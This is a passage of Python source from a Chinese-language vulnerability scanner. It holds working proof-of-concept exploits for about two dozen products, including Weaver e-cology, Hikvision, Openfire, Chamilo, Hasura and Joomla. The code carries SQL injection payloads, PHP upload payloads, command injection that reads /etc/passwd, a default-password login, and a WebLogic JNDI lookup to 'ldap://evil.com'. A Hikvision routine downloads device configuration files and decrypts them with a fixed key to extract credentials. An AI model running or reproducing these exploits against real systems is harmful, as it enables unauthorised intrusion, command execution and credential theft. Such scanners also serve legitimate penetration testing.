                            self.append_to_output(f"[-] {url} 不存在宏景HCM categories SQL注入", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "2.蓝凌OA存在任意文件读取漏洞(CNVD-2021-28277)":
                    if url.endswith("/"):
                        path = "sys/ui/extend/varkind/custom.jsp"
                    else:
                        path = "/sys/ui/extend/varkind/custom.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'root' in res:
                            self.append_to_output(f"[+] {url} 存在蓝凌OA任意文件读取漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在蓝凌OA任意文件读取漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "3.motionEye应用程序信息泄露漏洞(CVE-2022-25568)":
                    if url.endswith("/"):
                        path = "config/list"
                    else:
                        path = "/config/list"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'root' in res:
                            self.append_to_output(f"[+] {url} 存在motionEye应用程序 config/list 信息泄露漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在motionEye应用程序 config/list 信息泄露漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "4.泛微e8任意用户登录漏洞":
                    if url.endswith("/"):
                        path = "mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp"
                    else:
                        path = "/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'location.replace' not in res and '建议设置为' not in res:
                            self.append_to_output(f"[+] {url} 存在泛微e-cology ofsLogin.jsp任意用户登录漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微e-cology ofsLogin.jsp任意用户登录漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "5.泛微e-cology9 SQL注入漏洞(QVD-2023-5012)":
                    if url.endswith("/"):
                        path = "mobile/%20/plugin/browser.jsp"
                    else:
                        path = "/mobile/%20/plugin/browser.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    payload = {
                        "isDis": "1",
                        "browserTypeId": "269",
                        "keyword": "%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537"
                    }

                    try:
                        req = requests.post(encodetext, data=payload, headers=headers, timeout=5, proxies=proxies)
                        res = req.text
                        if req.status_code == 200 and 'autoCount' in res:
                            self.append_to_output(f"[+] {url} 存在泛微e-cology9 SQL注入漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在泛微e-cology9 SQL注入漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微e-cology9 SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "6.畅捷通CRM SQL注入漏洞":#待开发
                    if url.endswith("/"):
                        path = "WebSer~1/create_site.php?site_id=1+AND+%28SELECT+6663+FROM+%28SELECT%28SLEEP%285%29%29%29Jdzn%29"
                    else:
                        path = "/WebSer~1/create_site.php?site_id=1+AND+%28SELECT+6663+FROM+%28SELECT%28SLEEP%285%29%29%29Jdzn%29"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在畅捷通CRM SQL注入漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在畅捷通CRM SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "7.畅捷通T+ SQL注入漏洞(QVD-2023-13612)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    if url.endswith("/"):
                        path = "tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"
                    else:
                        path = "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    data = {
                        "accNum": "3'",
                        "functionTag": "SYS0104",
                        "url": ""
                    }
                    try:
                        req = requests.post(encodetext, headers=headers, json=data, timeout=5, proxies=proxies)
                        res = req.text

                        if req.status_code == 200 and 'value' in res:
                            self.append_to_output(f"[+] {url} 存在畅捷通T+ SQL注入漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在畅捷通T+ SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "8.GeoServer SQL注入漏洞(CVE-2023-25157)":#待开发
                    if url.endswith("/"):
                        path = "geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"
                    else:
                        path = "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在GeoServer SQL注入漏洞(CVE-2023-25157)！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在GeoServer SQL注入漏洞(CVE-2023-25157)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "9.Smartbi内置用户登陆绕过漏洞":
                    if url.endswith("/"):
                        path = "smartbi/vision/RMIServlet"
                    else:
                        path = "/smartbi/vision/RMIServlet"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'retCode' in req:
                            self.append_to_output(f"[+] {url} 存在Smartbi内置用户登陆绕过漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Smartbi内置用户登陆绕过漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "10.金蝶云星空RCE漏洞":
                    if url.endswith("/"):
                        path = "Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"
                    else:
                        path = "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    data = {
                        "ap0": "asdas",
                        "format": "3"
                    }

                    try:
                        req = requests.post(encodetext, data=json.dumps(data), headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200 and 'response' in res:
                            self.append_to_output(f"[+] {url} 存在金蝶云星空RCE漏洞！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在金蝶云星空RCE漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在金蝶云星空RCE漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "11.Openfire身份认证绕过漏洞(CVE-2023-32315)":
                    if url.endswith("/"):
                        path = "setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
                    else:
                        path = "/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'INFO' in req:
                            self.append_to_output(f"[+] {url} 存在Openfire身份认证绕过漏洞(CVE-2023-32315)！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Openfire身份认证绕过漏洞(CVE-2023-32315)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "12.HIKVISION-海康威视iVMS综合安防系统任意文件上传漏洞":
                    if url.endswith("/"):
                        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
                    else:
                        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
                    encodetext = url + path
                    input_name = hashlib.md5()
                    md5hash = input_name.update(encodetext.encode("utf-8"))
                    if url.endswith("/"):
                        path = "eps/api/resourceOperations/upload?token="
                    else:
                        path = "/eps/api/resourceOperations/upload?token="
                    pocurl = url + path + md5hash
                    data = {
                        "service": urllib.parse.quote(url + "/home/index.action")
                    }
                    try:
                        response = requests.post(url=pocurl, headers=headers, data=data, verify=False, timeout=3)
                        if response.status_code == 200:
                            self.append_to_output(Fore.GREEN + f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！", "red")
                        else:
                            self.append_to_output(Fore.RED + f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "13.泛微 E-Office文件上传漏洞复现(CVE-2023-2523)":
                    if url.endswith("/"):
                        path = "E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
                    else:
                        path = "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
                    }
                    data = '''
                    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
                    Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
                    Content-Type: image/jpeg

                    <?php phpinfo();?>
                    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
                    Content-Disposition: form-data; name="file"; filename=""
                    Content-Type: application/octet-stream


                    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
                    '''

                    try:
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2523)！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2523)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微 E-Office文件上传漏洞复现(CVE-2023-2523)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "14.泛微 E-Office文件上传漏洞复现(CVE-2023-2648)":
                    if url.endswith("/"):
                        path = "inc/jquery/uploadify/uploadify.php"
                    else:
                        path = "/inc/jquery/uploadify/uploadify.php"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
                    }
                    data = '''
                    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
                    Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
                    Content-Type: image/jpeg

                    <?php phpinfo();?>
                    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
                    '''

                    try:
                        req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2648)！！！！", "red")
                            #self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2648)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微 E-Office文件上传漏洞复现(CVE-2023-2648)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "15.HIKVISION-视频监控(CVE-2017-7921)":
                    if url.endswith("/"):
                        path = "Security/users?auth=YWRtaW46Mg"
                    else:
                        path = "/Security/users?auth=YWRtaW46Mg"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    # 补足密文为16的倍数
                    def add_to_16(s):
                        while len(s) % 16 != 0:
                            s += b'\0'
                        return s

                        # AES解密，密文是下载的configurationFile文件，密钥为固定值279977f62f6cfd2d91cd75b889ce0c9a

                    # 固定密钥+AES......被锤烂不意外
                    # 注意那个iv 因为这里使用的是ECB模式所以根本不需要iv.....估计是赶工没写CBC,不然这开头的iv要它何用
                    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
                        key = bytes.fromhex(hex_key)
                        ciphertext = add_to_16(ciphertext)
                        # iv = ciphertext[:AES.block_size]
                        cipher = AES.new(key, AES.MODE_ECB)
                        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
                        return plaintext.rstrip(b"\0")

                    # 解密完了的明文还需要挨个异或0x73, 0x8B, 0x55, 0x44的循环才能得到最终明文
                    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
                        return bytes(a ^ b for a, b in zip(data, cycle(key)))

                    def strings(file):
                        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
                        shortestReturnChar = 2
                        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
                        pattern = re.compile(regExp)
                        return pattern.findall(file)

                    def crypt_script(file_path):
                        #file_path = r"D:\python\allattack\configurationFile"  # 指定配置文件的绝对路径
                        if not os.path.isfile(file_path):
                            return self.append_to_output("指定的配置文件不存在。", "green")

                        xor = xore(decrypt(open(file_path, 'rb').read()))
                        result_list = strings(xor.decode('ISO-8859-1'))
                        #self.append_to_output(result_list, "green")
                        result_list_str = ', '.join(result_list)  # 将列表中的元素连接为一个字符串
                        self.append_to_output(result_list_str, "green")

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'userName' in res:
                            self.append_to_output(f"[+] {url} 存在HIKVISION-视频监控(CVE-2017-7921)！！！！", "red")
                            self.append_to_output(res, "yellow")
                            urlres = url +'/System/configurationFile?auth=YWRtaW46Mg'

                            # 发起GET请求下载配置文件
                            response = requests.get(urlres)

                            if response.status_code == 200:
                                filename = "configurationFile"  # 配置文件名固定为"configurationFile"

                                # 保存配置文件
                                with open(filename, 'wb') as file:
                                    file.write(response.content)

                                # 获取文件的绝对路径
                                file_path = os.path.abspath(filename)

                                self.append_to_output(f"配置文件已下载并保存为:{filename}", "green")
                                self.append_to_output(f"文件路径:{file_path}",  "green")
                                crypt_script(file_path)
                            else:
                                self.append_to_output(f"无法下载配置文件。状态码:{response.status_code}", "green")
                        else:
                            self.append_to_output(f"[-] {url} 不存在HIKVISION-视频监控(CVE-2017-7921)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "16.shopxo文件读取(CNVD-2021-15822)":
                    if url.endswith("/"):
                        path = "public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="
                    else:
                        path = "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path

                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'root' in res:
                            self.append_to_output(f"[+] {url} 存在shopxo文件读取(CNVD-2021-15822)！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在shopxo文件读取(CNVD-2021-15822)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "17.weblogicRCE(CVE-2023-21839)":
                    ip, port = url.split(":")
                    #print("IP:", ip)
                    #print("Port:", port)
                    VulnDetection.verify(self,ip, port,"ldap://evil.com")  # 创建POC类的实例
                    #poc_instance.verify()  # 调用verify方法
                if vulnerability == "18.Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)":
                    if url.endswith("/"):
                        path = "main/webservices/additional_webservices.php"
                    else:
                        path = "/main/webservices/additional_webservices.php"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    payload = '''
                    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{http://ip:port}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                      <SOAP-ENV:Body>
                        <ns1:wsConvertPpt>
                          <param0 xsi:type="ns2:Map">
                            <item>
                              <key xsi:type="xsd:string">file_data</key>
                              <value xsi:type="xsd:string"></value>
                            </item>
                            <item>
                              <key xsi:type="xsd:string">file_name</key>
                              <value xsi:type="xsd:string">`{}`.pptx'|" |cat /etc/passwd||a #</value>
                            </item>
                            <item>
                              <key xsi:type="xsd:string">service_ppt2lp_size</key>
                              <value xsi:type="xsd:string">720x540</value>
                            </item>
                          </param0>
                        </ns1:wsConvertPpt>
                      </SOAP-ENV:Body>
                    </SOAP-ENV:Envelope>
                    '''  # Replace "filename" with the desired filename

                    try:
                        req = requests.post(encodetext, data=payload, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "19.华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)":
                    if url.endswith("/"):
                        path = "jshERP-boot/user/getAllList;.ico"
                    else:
                        path = "/jshERP-boot/user/getAllList;.ico"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
                        'Accept': '*/*',
                        'Connection': 'Keep-Alive'
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "20.Joomla存在未授权访问漏洞(CVE-2023-23752)":
                    if url.endswith("/"):
                        path = "api/index.php/v1/config/application?public=true"
                    else:
                        path = "/api/index.php/v1/config/application?public=true"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
                        'Accept': '*/*',
                        'Connection': 'Keep-Alive'
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'user' in res:
                            self.append_to_output(f"[+] {url} 存在Joomla存在未授权访问漏洞(CVE-2023-23752)！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Joomla存在未授权访问漏洞(CVE-2023-23752)", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "21.nginx WebUI Cmd远程命令执行漏洞":
                    if url.endswith("/"):
                        path = "AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx"
                    else:
                        path = "/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
                    }
                    try:
                        req = requests.get(encodetext, headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text

                        if req.status_code == 200 and 'success' in res:
                            self.append_to_output(f"[+] {url} 存在nginx WebUI Cmd远程命令执行漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 不存在nginx WebUI Cmd远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "22.中新金盾信息安全管理系统默认口令":
                    if url.endswith("/"):
                        path = "?q=common/login"
                    else:
                        path = "/?q=common/login"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    payload = "name=admin&password=zxsoft1234!%40%23%24&checkcode=ptbh&doLoginSubmit=1"  # Replace "filename" with the desired filename

                    try:
                        req = requests.post(encodetext, data=payload, headers=headers, timeout=20, proxies=self.proxies)
                        res = req.text
                        #if req.status_code == 200 and "1" in res and "ZXSOFT_JDIS_USR_NAME=deleted" in res:
                        if req.status_code == 200 and "1" in res:
                            self.append_to_output(f"[+] {url} 存在中新金盾信息安全管理系统默认口令！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在中新金盾信息安全管理系统默认口令！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在中新金盾信息安全管理系统默认口令", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "23.Hasura GraphQL Engine远程命令执行漏洞":
                    if url.endswith("/"):
                        path = "v1/query"
                    else:
                        path = "/v1/query"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    data = {
                        "type": "bulk",
                        "args": [
                            {
                                "type": "run_sql",
                                "args": {
                                    "sql": "SET LOCAL statement_timeout = 10000;",
                                    "cascade": False,
                                    "read_only": False
                                }
                            },
                            {
                                "type": "run_sql",
                                "args": {
                                    "sql": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;",
                                    "cascade": False,
                                    "read_only": False
                                }
                            }
                        ]
                    }
                    try:
                        req = requests.post(encodetext, data=json.dumps(data), headers=headers, timeout=5, proxies=self.proxies)
                        res = req.text
                        #if req.status_code == 200 and "1" in res and "ZXSOFT_JDIS_USR_NAME=deleted" in res:
                        if req.status_code == 200:
                            self.append_to_output(f"[+] {url} 存在Hasura GraphQL Engine远程命令执行漏洞！！！！", "red")
                            self.append_to_output(res, "yellow")
                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 存在Hasura GraphQL Engine远程命令执行漏洞！！！！" + "\n")
                                file.write(res + "\n")
                        else:
                            self.append_to_output(f"[-] {url} 不存在Hasura GraphQL Engine远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "24.Apache Superset未授权访问漏洞(CVE-2023-27524)":
                    if url.endswith("/"):
                        path = "login/"
                    else:
                        path = "/login/"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    headers = {
                        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    SECRET_KEYS = [
                        b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
                        b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',  # version >= 1.4.1
                        b'thisISaSECRET_1234',  # deployment template
                        b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',  # documentation
                        b'TEST_NON_DEV_SECRET'  # docker compose
                    ]
                    try:
                        req = requests.post(encodetext, headers=headers, verify=False, timeout=30, proxies=self.proxies)
                        res = req.text
                        #if req.status_code == 200 and "1" in res and "ZXSOFT_JDIS_USR_NAME=deleted" in res:
                        if req.status_code != 200:
                            self.append_to_output(f"[-] {url} 不存在Apache Superset未授权访问漏洞", "green")
                        else:
                            session_cookie = None
                            for c in req.cookies:
                                if c.name == 'session':
                                    session_cookie = c.value
                                    break

                            if not session_cookie:
                                self.append_to_output('错误: 没有发现session会话', "green")
                            else:
                                self.append_to_output(f'获得会话: {session_cookie}', "red")

                                try:
                                    decoded = session.decode(session_cookie)
                                    self.append_to_output(f'解码的会话cookie: {decoded}', "yellow")
                                except:
                                    self.append_to_output('Error: Not a Flask session cookie', "green")

                                match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', req.text)
                                if match:
                                    version = match.group(1)
                                else:
                                    version = '未知'

